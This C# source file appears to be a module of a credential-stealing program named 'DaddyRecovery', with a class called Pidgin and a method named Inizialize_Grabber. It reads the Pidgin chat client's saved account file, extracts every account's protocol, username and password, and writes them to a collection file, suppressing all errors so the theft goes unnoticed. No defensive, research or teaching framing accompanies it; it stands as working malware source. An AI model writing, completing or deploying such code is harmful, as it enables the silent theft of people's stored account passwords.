namespace DaddyRecovery.Applications
{
    using System;
    using System.IO;
    using System.Text;
    using System.Xml;
    using Helpers;

    public static class Pidgin
    {
        public static void Inizialize_Grabber()
        {
            if (CombineEx.ExistsFile(GlobalPath.PidPurple))
            {
                try
                {
                    var build = new StringBuilder();
                    using (TextReader tr = new StreamReader(GlobalPath.PidPurple))
                    {
                        var rd = new XmlTextReader(tr) { DtdProcessing = DtdProcessing.Prohibit };
                        var xs = new XmlDocument() { XmlResolver = null };
                        xs.Load(rd);
                        {
                            foreach (XmlNode nl in xs.DocumentElement.ChildNodes)
                            {
                                XmlNodeList il = nl?.ChildNodes;
                                build.AppendLine($"Protocol: {il[0].InnerText}");
                                build.AppendLine($"UserName: {il[1].InnerText}");
                                build.AppendLine($"Password: {il[2].InnerText}{Environment.NewLine}");
                            }
                        }
                        rd.Close();
                    }
                    CombineEx.CreateFile(true, GlobalPath.PidginSave, build?.ToString());
                    build.Clear();
                }
                catch { }
            }
        }
    }
}